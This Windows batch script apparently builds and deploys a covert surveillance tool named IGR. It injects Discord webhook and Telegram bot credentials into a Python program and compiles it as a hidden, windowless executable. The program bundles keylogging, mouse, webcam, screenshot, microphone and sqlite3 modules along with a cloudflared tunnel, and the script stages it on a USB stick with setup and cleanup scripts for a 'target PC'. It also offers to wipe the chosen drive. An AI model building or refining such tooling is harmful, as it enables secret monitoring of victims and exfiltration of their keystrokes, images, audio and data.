@echo off
setlocal enabledelayedexpansion
echo ============================================
echo   IGR Build - Compiling executable
echo ============================================
echo.

REM Check for config.txt
if not exist "config.txt" (
    echo ERROR: config.txt not found!
    echo   Copy config.example.txt to config.txt and fill in your values.
    pause
    exit /b 1
)

REM Read config.txt values
echo [1/6] Reading config.txt...
set "DISCORD_WEBHOOK="
set "DISCORD_USERNAME=IGR"
set "DASHBOARD_PASSWORD="
set "TELEGRAM_BOT_TOKEN="
set "TELEGRAM_CHAT_ID="
set "UPDATE_URL="

for /f "usebackq tokens=1,* delims==" %%a in ("config.txt") do (
    set "line=%%a"
    if not "!line:~0,1!"=="#" (
        if "%%a"=="DISCORD_WEBHOOK" set "DISCORD_WEBHOOK=%%b"
        if "%%a"=="DISCORD_USERNAME" set "DISCORD_USERNAME=%%b"
        if "%%a"=="DASHBOARD_PASSWORD" set "DASHBOARD_PASSWORD=%%b"
        if "%%a"=="TELEGRAM_BOT_TOKEN" set "TELEGRAM_BOT_TOKEN=%%b"
        if "%%a"=="TELEGRAM_CHAT_ID" set "TELEGRAM_CHAT_ID=%%b"
        if "%%a"=="UPDATE_URL" set "UPDATE_URL=%%b"
    )
)

REM Validate: at least 1 of Discord or Telegram must be configured
set "HAS_DISCORD=0"
set "HAS_TELEGRAM=0"
if defined DISCORD_WEBHOOK set "HAS_DISCORD=1"
if defined TELEGRAM_BOT_TOKEN if defined TELEGRAM_CHAT_ID set "HAS_TELEGRAM=1"

if "%HAS_DISCORD%"=="0" if "%HAS_TELEGRAM%"=="0" (
    echo ERROR: At least Discord or Telegram must be configured in config.txt!
    echo   Set DISCORD_WEBHOOK or TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID.
    pause
    exit /b 1
)

if "%HAS_DISCORD%"=="0" echo   NOTE: Discord not configured, using Telegram only.
if "%HAS_TELEGRAM%"=="0" echo   NOTE: Telegram not configured, using Discord only.
if not defined DASHBOARD_PASSWORD echo   WARNING: DASHBOARD_PASSWORD is empty.

echo   Config loaded.

REM Create build copy of main.py with injected values
echo.
echo [2/6] Injecting configuration...
copy /y "main.py" "main_build.py" >nul

powershell -Command "(Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_WEBHOOK', '%DISCORD_WEBHOOK%' -replace 'BUILD_DISCORD_USERNAME', '%DISCORD_USERNAME%' -replace 'BUILD_DASHBOARD_PASSWORD', '%DASHBOARD_PASSWORD%' -replace 'BUILD_TELEGRAM_BOT_TOKEN', '%TELEGRAM_BOT_TOKEN%' -replace 'BUILD_TELEGRAM_CHAT_ID', '%TELEGRAM_CHAT_ID%' -replace 'BUILD_UPDATE_URL', '%UPDATE_URL%' | Set-Content 'main_build.py' -NoNewline"

echo   Values injected.

echo.
echo [3/6] Installing dependencies...
pip install pyinstaller flask requests opencv-python pynput pillow pyaudio cryptography 2>nul
echo   Done.

echo.
echo [4/6] Downloading cloudflared if missing...
if not exist cloudflared.exe (
    echo Downloading cloudflared...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile 'cloudflared.exe'"
    if exist cloudflared.exe (
        echo   Downloaded cloudflared.exe
    ) else (
        echo   WARNING: cloudflared download failed - will auto-download on target PC
    )
) else (
    echo   cloudflared.exe already present
)

echo.
echo [5/6] Compiling igr.exe...
python -m PyInstaller --onefile --noconsole --name igr --clean --noconfirm ^
    --hidden-import flask ^
    --hidden-import requests ^
    --hidden-import pynput.keyboard ^
    --hidden-import pynput.mouse ^
    --hidden-import cv2 ^
    --hidden-import PIL.Image ^
    --hidden-import PIL.ImageTk ^
    --hidden-import PIL.ImageGrab ^
    --hidden-import pyaudio ^
    --hidden-import cryptography ^
    --hidden-import cryptography.hazmat.primitives.ciphers.aead ^
    --hidden-import sqlite3 ^
    main_build.py

REM Clean up build copy
del /f /q "main_build.py" >nul 2>&1

if not exist "dist\igr.exe" (
    echo.
    echo ERROR: Build failed - igr.exe not found in dist\
    pause
    exit /b 1
)

echo.
echo [6/6] USB Deployment...
echo.

REM Detect removable drives (USB sticks) via PowerShell
set "USB_COUNT=0"
for /f "tokens=1 delims= " %%d in ('powershell -Command "Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -ExpandProperty DeviceID" 2^>nul') do (
    set /a USB_COUNT+=1
    set "USB_!USB_COUNT!=%%d"
)

if %USB_COUNT%==0 (
    echo   No USB sticks detected.
    echo.
    echo ============================================
    echo   BUILD SUCCESSFUL
    echo ============================================
    echo   Output: dist\igr.exe
    echo.
    echo   Manually copy to USB:
    echo     USB root:       setup.bat, cleanup.bat
    echo     USB\subfiles\:   igr.exe, cloudflared.exe
    echo ============================================
    echo.
    pause
    exit /b 0
)

echo   Found %USB_COUNT% USB stick(s):
for /l %%i in (1,1,%USB_COUNT%) do (
    echo     %%i. !USB_%%i!
)
echo.

set /p "USB_CHOICE=Select USB stick number (or 0 to skip): "
if "%USB_CHOICE%"=="0" (
    echo   Skipped USB deployment.
    echo.
    echo ============================================
    echo   BUILD SUCCESSFUL
    echo ============================================
    echo   Output: dist\igr.exe
    echo ============================================
    echo.
    pause
    exit /b 0
)

set "USB_DRIVE=!USB_%USB_CHOICE%!"
if not defined USB_DRIVE (
    echo   Invalid choice.
    pause
    exit /b 1
)

echo.
echo   Selected: %USB_DRIVE%
echo.
echo   [1] Wipe USB and install IGR only
echo   [2] Add IGR alongside existing files
echo.
set /p "USB_MODE=Choose mode (1 or 2): "

if "%USB_MODE%"=="1" (
    echo.
    echo   Wiping %USB_DRIVE% ...
    rd /s /q "%USB_DRIVE%\" 2>nul
    del /q "%USB_DRIVE%\*" 2>nul
    echo   Done.
)

echo.
echo   Copying files to %USB_DRIVE% ...
if not exist "%USB_DRIVE%\subfiles" mkdir "%USB_DRIVE%\subfiles"
copy /y "dist\igr.exe" "%USB_DRIVE%\subfiles\igr.exe" >nul
copy /y "cloudflared.exe" "%USB_DRIVE%\subfiles\cloudflared.exe" >nul
copy /y "setup.bat" "%USB_DRIVE%\setup.bat" >nul
echo   Done.

set "CLEANUP_COPIED=0"
echo.
set /p "CLEANUP_CHOICE=Also copy cleanup.bat to USB? (y/n): "
if /i "%CLEANUP_CHOICE%"=="y" (
    copy /y "cleanup.bat" "%USB_DRIVE%\cleanup.bat" >nul
    echo   cleanup.bat copied to USB root.
    set "CLEANUP_COPIED=1"
) else (
    echo   Skipped cleanup.bat.
)

echo.
echo ============================================
echo   BUILD + USB DEPLOY SUCCESSFUL
echo ============================================
echo   USB: %USB_DRIVE%
echo     Root:       setup.bat
if "%CLEANUP_COPIED%"=="1" echo     Root:       cleanup.bat
echo     subfiles\:  igr.exe, cloudflared.exe
echo ============================================
echo.
pause
